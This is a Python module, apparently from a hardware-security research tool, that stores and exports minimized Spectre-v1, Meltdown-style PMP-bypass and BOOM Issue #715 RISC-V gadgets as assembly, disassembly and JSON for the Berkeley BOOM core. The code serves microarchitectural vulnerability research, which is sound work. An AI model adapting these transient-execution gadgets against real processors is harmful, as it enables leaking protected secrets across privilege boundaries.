"""Proof-of-Concept (PoC) exploit disassembly and assembly export.

Provides minimized assembly counterexamples and machine code disassemblies
discovered across Berkeley BOOM microarchitectural security targets.
"""

from __future__ import annotations

import json
from dataclasses import asdict, dataclass
from pathlib import Path


@dataclass(frozen=True)
class PocInstruction:
    address: str
    opcode_hex: str
    mnemonic: str
    operands: str
    microarch_phase: str
    annotation: str


@dataclass(frozen=True)
class PocGadget:
    name: str
    variant: str
    description: str
    target_subsystem: str
    registers_used: list[str]
    assembly_template: str
    instructions: list[PocInstruction]


POCS: dict[str, PocGadget] = {
    "transient-cache": PocGadget(
        name="transient-cache",
        variant="Spectre-v1 Bounds Check Bypass (BCB)",
        description="Transient memory load under mispredicted branch training probe array.",
        target_subsystem="Branch Prediction Unit & L1 Data Cache",
        registers_used=[
            "a0 (array_size)",
            "a1 (untrusted_index)",
            "a2 (probe_base)",
            "t0 (secret)",
        ],
        assembly_template="""# SpecHunter Minimized PoC: Spectre-v1 Transient Cache Leakage
# Target: Berkeley BOOM L1 D-Cache
.global _start
_start:
    bgeu    a1, a0, .mispredict_shadow  # Branch mispredicted as taken
    lb      t0, 0(a1)                   # Speculatively loads protected secret byte
    slli    t0, t0, 6                   # Multiply by 64 (cache line stride)
    add     t0, a2, t0                  # Calculate probe address
    lb      t1, 0(t0)                   # Modulates L1 Data Cache tag state
.mispredict_shadow:
    fence.i                             # Architectural synchronization barrier
""",
        instructions=[
            PocInstruction(
                "0x80001000", "00a5f863", "bgeu", "a1, a0, 16", "BPU / ROB", "Branch mask allocated"
            ),
            PocInstruction(
                "0x80001004", "00058283", "lb", "t0, 0(a1)", "LSU Issue", "Speculative secret load"
            ),
            PocInstruction(
                "0x80001008", "00629293", "slli", "t0, t0, 6", "Integer ALU", "Line stride scaling"
            ),
            PocInstruction(
                "0x8000100c", "005602b3", "add", "t0, a2, t0", "Integer ALU", "Probe address calc"
            ),
            PocInstruction(
                "0x80001010", "00028303", "lb", "t1, 0(t0)", "L1 D-Cache", "Modulates cache state"
            ),
            PocInstruction(
                "0x80001014", "0000100f", "fence.i", "", "Pipeline Flush", "Branch resolved taken"
            ),
        ],
    ),
    "privilege-bypass": PocGadget(
        name="privilege-bypass",
        variant="Meltdown Rogue Data Cache Load (RDCL)",
        description="User-mode transient access to supervisor PMP-protected physical page.",
        target_subsystem="Physical Memory Protection (PMP) & LSU Privilege Gate",
        registers_used=["s0 (protected_page)", "s1 (probe_array)", "t0 (leak)"],
        assembly_template="""# SpecHunter Minimized PoC: Meltdown-Style PMP Privilege Bypass
# Target: Berkeley BOOM LSU PMP Check
.global _start
_start:
    # Machine mode entered user mode via mret with PMP denying user access
    ld      t0, 0(s0)                   # Faulting load: raises access fault exception
    andi    t0, t0, 0x1                 # Extract low-order secret bit
    slli    t0, t0, 12                  # 4 KiB page shift
    add     t0, s1, t0                  # Select probe cache line
    lb      t1, 0(t0)                   # Speculative dependent load transmits secret
    # Trap handler receives load-access fault (cause 5) and skips faulting instruction
""",
        instructions=[
            PocInstruction(
                "0x80002000", "00043283", "ld", "t0, 0(s0)", "LSU / PMP", "Faulting access"
            ),
            PocInstruction(
                "0x80002004", "0012f293", "andi", "t0, t0, 1", "Integer ALU", "Extract secret bit"
            ),
            PocInstruction(
                "0x80002008", "00c29293", "slli", "t0, t0, 12", "Integer ALU", "Page stride shift"
            ),
            PocInstruction(
                "0x8000200c", "009482b3", "add", "t0, s1, t0", "Integer ALU", "Probe address calc"
            ),
            PocInstruction(
                "0x80002010", "00028303", "lb", "t1, 0(t0)", "L1 D-Cache", "Transient transmit"
            ),
        ],
    ),
    "issue-715": PocGadget(
        name="issue-715",
        variant="Berkeley BOOM Issue #715 LSU Load Gating",
        description="Historical BOOM Issue #715 load sequence with poisoned operand and DTLB req.",
        target_subsystem="Berkeley BOOM LSU / Issue Register Read / DTLB",
        registers_used=[
            "t1 (base)",
            "sp (poisoned_dest)",
            "s1 (target)",
            "a0 (translation_base)",
        ],
        assembly_template="""# SpecHunter Minimized PoC: Berkeley BOOM Issue #715 Gadget
# Target: Berkeley BOOM LargeBoomConfig Issue Pipeline (Cycles 3804-3811)
.global _start
_start:
    jalr    tp, 572(a0)                 # Control transfer setting up speculative context
    lb      sp, -2048(t1)               # 0x80028e00: Load misses or poisons destination sp
    ld      s1, 0(sp)                   # 0x80028e04: Dependent load with poisoned sp
    lb      s1, 1439(a0)                # 0x80028e08: Independent load emitting 0x59f DTLB request
    srlw    sp, a0, ra                  # Recovery instruction
""",
        instructions=[
            PocInstruction(
                "0x80028dfc", "23c50267", "jalr", "tp, 572(a0)", "BPU / Jump", "Branch context set"
            ),
            PocInstruction(
                "0x80028e00", "80030103", "lb", "sp, -2048(t1)", "LSU Pipe", "Dest sp poisoned"
            ),
            PocInstruction(
                "0x80028e04", "00013483", "ld", "s1, 0(sp)", "LSU Issue", "Gated by poison"
            ),
            PocInstruction(
                "0x80028e08", "59f50483", "lb", "s1, 1439(a0)", "L1 DTLB Fire", "0x59f translation"
            ),
            PocInstruction(
                "0x80028e0c", "0015513b", "srlw", "sp, a0, ra", "ALU / Retire", "Pipeline drain"
            ),
        ],
    ),
}


def list_pocs() -> list[str]:
    """Return available PoC gadget names."""
    return list(POCS.keys())


def get_poc(name: str) -> PocGadget:
    """Retrieve a PoC gadget by name."""
    if name not in POCS:
        raise KeyError(f"Unknown PoC gadget: '{name}'. Available: {list_pocs()}")
    return POCS[name]


def render_poc_text(name: str) -> str:
    """Render a formatted human-readable PoC disassembly report."""
    poc = get_poc(name)
    lines = [
        f"=== SpecHunter Proof-of-Concept: {poc.name} ===",
        f"Variant:     {poc.variant}",
        f"Description: {poc.description}",
        f"Subsystem:   {poc.target_subsystem}",
        f"Registers:   {', '.join(poc.registers_used)}",
        "",
        "--- Disassembly & Microarchitectural Pipeline Phases ---",
        f"{'Address':<12} {'Opcode':<10} {'Instruction':<20} {'Pipeline Phase':<18} {'Annotation'}",
        "-" * 80,
    ]
    for insn in poc.instructions:
        inst_str = f"{insn.mnemonic} {insn.operands}".strip()
        lines.append(
            f"{insn.address:<12} {insn.opcode_hex:<10} {inst_str:<20} "
            f"{insn.microarch_phase:<18} {insn.annotation}"
        )

    lines.extend(
        [
            "",
            "--- Minimized RISC-V Assembly Source ---",
            poc.assembly_template,
        ]
    )
    return "\n".join(lines)


def render_poc_json(name: str | None = None) -> str:
    """Render PoC gadget(s) as structured JSON."""
    if name is not None:
        data = asdict(get_poc(name))
    else:
        data = {k: asdict(v) for k, v in POCS.items()}
    return json.dumps(data, indent=2) + "\n"


def export_pocs(output_dir: Path) -> list[Path]:
    """Export standalone RISC-V assembly files (.s) into output_dir."""
    output_dir.mkdir(parents=True, exist_ok=True)
    exported = []
    for name, poc in POCS.items():
        s_path = output_dir / f"{name}.s"
        s_path.write_text(poc.assembly_template, encoding="utf-8")
        exported.append(s_path)

        # Also write JSON metadata
        json_path = output_dir / f"{name}.json"
        json_path.write_text(json.dumps(asdict(poc), indent=2) + "\n", encoding="utf-8")
        exported.append(json_path)

    return exported
